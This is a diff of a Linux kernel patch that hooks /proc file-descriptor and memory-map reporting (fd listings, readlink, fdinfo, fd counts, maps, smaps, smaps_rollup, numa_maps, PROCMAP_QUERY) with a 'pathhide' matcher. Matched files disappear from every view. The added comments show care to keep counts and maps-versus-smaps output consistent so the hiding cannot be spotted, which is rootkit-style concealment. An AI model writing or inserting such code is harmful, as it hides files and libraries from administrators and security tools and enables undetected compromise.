@@ -1,31 +1,42 @@
---- a/fs/proc/task_mmu.c
-+++ b/fs/proc/task_mmu.c
-@@ -462,6 +462,10 @@
- 	unsigned long long pgoff = 0;
- 	unsigned long start, end;
- 	dev_t dev = 0;
-+	extern bool pathhide_match_file(struct file *file);
-+
-+	if (vma->vm_file && pathhide_match_file(vma->vm_file))
-+		return;
- 
- 	if (vma->vm_file) {
- 		const struct inode *inode = file_user_inode(vma->vm_file);
-@@ -1303,6 +1307,10 @@
- {
- 	struct vm_area_struct *vma = v;
- 	struct mem_size_stats mss = {};
-+	extern bool pathhide_match_file(struct file *file);
-+
-+	if (vma->vm_file && pathhide_match_file(vma->vm_file))
-+		return 0;
- 
- 	if (!vma_pages(vma))
- 		goto show_pad;
-
 --- a/fs/proc/fd.c
 +++ b/fs/proc/fd.c
-@@ -251,6 +251,7 @@
+@@ -115,11 +115,18 @@ static const struct file_operations proc_fdinfo_file_operations = {
+ static bool tid_fd_mode(struct task_struct *task, unsigned fd, fmode_t *mode)
+ {
+ 	struct file *file;
++	extern bool pathhide_match_file(struct file *file);
+ 
+ 	rcu_read_lock();
+ 	file = task_lookup_fdget_rcu(task, fd);
+ 	rcu_read_unlock();
+ 	if (file) {
++		/* Hide matched fds from lookup, readlink and fdinfo, and from
++		 * d_revalidate so a cached dentry re-checks and vanishes too. */
++		if (pathhide_match_file(file)) {
++			fput(file);
++			return false;
++		}
+ 		*mode = file->f_mode;
+ 		fput(file);
+ 	}
+@@ -184,9 +191,13 @@ static int proc_fd_link(struct dentry *dentry, struct path *path)
+ 
+ 		fd_file = fget_task(task, fd);
+ 		if (fd_file) {
+-			*path = fd_file->f_path;
+-			path_get(&fd_file->f_path);
+-			ret = 0;
++			extern bool pathhide_match_file(struct file *file);
++
++			if (!pathhide_match_file(fd_file)) {
++				*path = fd_file->f_path;
++				path_get(&fd_file->f_path);
++				ret = 0;
++			}
+ 			fput(fd_file);
+ 		}
+ 		put_task_struct(task);
+@@ -251,6 +262,7 @@ static int proc_readfd_common(struct file *file, struct dir_context *ctx,
  {
  	struct task_struct *p = get_proc_task(file_inode(file));
  	unsigned int fd;
@@ -33,7 +44,7 @@
  
  	if (!p)
  		return -ENOENT;
-@@ -271,6 +272,11 @@
+@@ -271,6 +283,11 @@ static int proc_readfd_common(struct file *file, struct dir_context *ctx,
  			break;
  		data.mode = f->f_mode;
  		rcu_read_unlock();
@@ -44,4 +55,120 @@
 +		}
  		fput(f);
  		data.fd = fd;
+ 
+@@ -291,21 +308,27 @@ static int proc_readfd_common(struct file *file, struct dir_context *ctx,
+ static int proc_readfd_count(struct inode *inode, loff_t *count)
+ {
+ 	struct task_struct *p = get_proc_task(inode);
+-	struct fdtable *fdt;
++	extern bool pathhide_match_file(struct file *file);
++	unsigned int fd = 0;
++	loff_t n = 0;
+ 
+ 	if (!p)
+ 		return -ENOENT;
+ 
+-	task_lock(p);
+-	if (p->files) {
+-		rcu_read_lock();
+-
+-		fdt = files_fdtable(p->files);
+-		*count = bitmap_weight(fdt->open_fds, fdt->max_fds);
++	/* Count fds directly, skipping matched ones, so stat(/proc/pid/fd)
++	 * st_size equals the number of entries readdir actually emits. */
++	rcu_read_lock();
++	for (;; fd++) {
++		struct file *f = task_lookup_next_fdget_rcu(p, &fd);
+ 
+-		rcu_read_unlock();
++		if (!f)
++			break;
++		if (!pathhide_match_file(f))
++			n++;
++		fput(f);
+ 	}
+-	task_unlock(p);
++	rcu_read_unlock();
++	*count = n;
+ 
+ 	put_task_struct(p);
+ 
+--- a/fs/proc/task_mmu.c
++++ b/fs/proc/task_mmu.c
+@@ -495,6 +495,14 @@ show_map_vma(struct seq_file *m, struct vm_area_struct *vma)
+ static int show_map(struct seq_file *m, void *v)
+ {
+ 	struct vm_area_struct *vma = v;
++	extern bool pathhide_match_file(struct file *file);
++
++	/* One decision point for the main line and the pad VMA: the pad is
++	 * synthesized anonymous (vm_file == NULL), so a guard inside
++	 * show_map_vma() would miss it and leave an orphan [page size compat]
++	 * line that smaps drops -- a maps-vs-smaps mismatch. */
++	if (vma->vm_file && pathhide_match_file(vma->vm_file))
++		return 0;
+ 
+ 	if (vma_pages(vma))
+ 		show_map_vma(m, vma);
+@@ -548,12 +556,18 @@ static struct vm_area_struct *query_matching_vma(struct mm_struct *mm,
+ 						 unsigned long addr, u32 flags)
+ {
+ 	struct vm_area_struct *vma;
++	extern bool pathhide_match_file(struct file *file);
+ 
+ next_vma:
+ 	vma = query_vma_find_by_addr(mm, addr);
+ 	if (!vma)
+ 		goto no_vma;
+ 
++	/* pathhide: a matched file-backed VMA must vanish -- range and name
++	 * together -- so treat it exactly like a permission mismatch. */
++	if (vma->vm_file && pathhide_match_file(vma->vm_file))
++		goto skip_vma;
++
+ 	/* user requested only file-backed VMA, keep iterating */
+ 	if ((flags & PROCMAP_QUERY_FILE_BACKED_VMA) && !vma->vm_file)
+ 		goto skip_vma;
+@@ -1303,6 +1317,10 @@ static int show_smap(struct seq_file *m, void *v)
+ {
+ 	struct vm_area_struct *vma = v;
+ 	struct mem_size_stats mss = {};
++	extern bool pathhide_match_file(struct file *file);
++
++	if (vma->vm_file && pathhide_match_file(vma->vm_file))
++		return 0;
+ 
+ 	if (!vma_pages(vma))
+ 		goto show_pad;
+@@ -1341,6 +1359,7 @@ static int show_smaps_rollup(struct seq_file *m, void *v)
+ 	unsigned long vma_start = 0, last_vma_end = 0;
+ 	int ret = 0;
+ 	VMA_ITERATOR(vmi, mm, 0);
++	extern bool pathhide_match_file(struct file *file);
+ 
+ 	priv->task = get_proc_task(priv->inode);
+ 	if (!priv->task)
+@@ -1363,6 +1382,8 @@ static int show_smaps_rollup(struct seq_file *m, void *v)
+ 
+ 	vma_start = vma->vm_start;
+ 	do {
++		if (vma->vm_file && pathhide_match_file(vma->vm_file))
++			continue;
+ 		smap_gather_stats(vma, &mss, 0);
+ 		last_vma_end = vma->vm_end;
+ 
+@@ -3267,10 +3288,14 @@ static int show_numa_map(struct seq_file *m, void *v)
+ 	struct mempolicy *pol;
+ 	pgoff_t ilx;
+ 	int nid;
++	extern bool pathhide_match_file(struct file *file);
+ 
+ 	if (!mm)
+ 		return 0;
+ 
++	if (file && pathhide_match_file(file))
++		return 0;
++
+ 	/* Ensure we start with an empty set of numa_maps statistics. */
+ 	memset(md, 0, sizeof(*md));
  
